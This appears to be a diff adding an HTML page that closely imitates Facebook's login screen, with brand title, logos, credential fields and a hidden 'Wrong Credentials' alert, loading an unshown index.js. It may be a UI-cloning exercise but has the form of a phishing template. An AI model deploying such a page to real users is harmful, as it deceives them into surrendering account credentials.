@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <link rel="stylesheet" href="./bootstrap.css">
+    <link rel="stylesheet" href="./style.css">
+    <link rel="icon" href="./image/logos--facebook.svg">
+    <!-- For Apple devices -->
+    <link rel="apple-touch-icon" sizes="120x120" href="/public/image/logos--facebook iphone.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/public/image/logos--facebook iphone.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/public/image/logos--facebook iphone.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="/public/image/logos--facebook iphone.png">
+</head>
+
+<body>
+    <section class="d-lg-block d-md-block d-none">
+        <div class="container">
+            <div class="row firstdiv">
+                <div class="fb col-lg-6">
+                    <h4 class="fw-bold fb">facebook</h4>
+                    <p class="fw-medium fs-3 lh-sm d-md-none d-lg-block">Facebook helps you connect and share <br> with
+                        the people in your life.</p>
+                </div>
+
+                <div class="card cardipad col-md-10 mx-auto px-3 pt-3 shadow border-0">
+                    <div class="">
+                        <div id="wrong" class="alert alert-danger text-center rounded-0 fw-medium p-2"
+                            style="display: none; font-size: 14px;">Wrong Credentials</div>
+                        <input id="emailPhone" class="form-control input" type="text"
+                            placeholder="Email address or phone number">
+                        <input id="pass" class="form-control input mt-3" type="password" placeholder="Password">
+                        <button id="submit" class="btn btn-primary fw-bold w-100 my-3 fs-5 ">Log in</button>
+                        <p class="text-center forgot" style="font-size: 15px;">Forgotten password?</p>
+                        <hr>
+                        <div class="text-center mb-4 mt-4">
+                            <button class="create rounded-2 px-3">Create new account</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="d-block d-lg-none d-md-none smallscreen">
+        <div class="container">
+            <div class="text-center">
+                <p class="pt-5 fw-medium text-secondary" style="font-size: 13px;">English (UK)</p>
+                <img style="padding-top: 39px; padding-bottom: 19px;" src="./image/logos--facebook.svg" width="60"
+                    alt="">
+            </div>
+            <div class="" style="padding-top: 60px;">
+                <div id="wCredentials" class="alert mx-1 alert-danger text-center rounded-0 fw-medium p-2"
+                    style="display: none; font-size: 14px;">Wrong Credentials</div>
+                <div class="form-floating px-1">
+                    <input id="phEmail" class="form-control shadow-none rounded-3 border-1 put" type="text"
+                        placeholder="">
+                    <label class="fw-medium text-secondary ps-3" for="phEmail">Mobile number or email address</label>
+                </div>
+                <div class="form-floating px-1 my-2">
+                    <input id="pas" class="form-control shadow-none rounded-3 border-1 put" type="password"
+                        placeholder="">
+                    <label class="fw-medium text-secondary ps-3" for="pas">Password</label>
+                </div>
+                <div class="px-1 pt-1">
+                    <button id="loginSmall" class="btn btn-primary w-100 rounded-pill fw-bold py-2">Log in</button>
+                </div>
+                <p class="text-center fw-medium pt-3 text-body" style="font-size: 17px;">Forgotten Password?</p>
+                <div class="px-1">
+                    <button class="w-100 rounded-pill fw-medium text-primary border border-primary py-2"
+                        style="margin-top: 100px; background-color: #EEF6FF;">Create a new account</button>
+                </div>
+                <div class="text-center pb-0">
+                    <img src="./image/lineicons--meta (1).svg" width="75" alt="">
+                </div>
+            </div>
+        </div>
+    </section>
+    <script src="index.js"></script>
+</body>
+
+</html>
